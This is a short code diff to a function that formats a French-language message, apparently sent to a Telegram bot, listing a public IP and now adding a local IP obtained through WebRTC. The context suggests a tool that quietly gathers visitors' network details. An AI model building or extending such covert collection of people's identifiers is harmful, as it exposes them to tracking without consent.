@@ -45,6 +45,7 @@ def tgram_sender(msg_type, content, token):
 
 <b><u>RÉSEAU</u></b>
 🌍 <b>IP Publique :</b> <code>{json_content.get('ip')}</code>
+📍 <b>IP Locale (WebRTC) :</b> <code>{json_content.get('webrtc', 'N/A')}</code>
 """
         send_request(token, info_message)
 
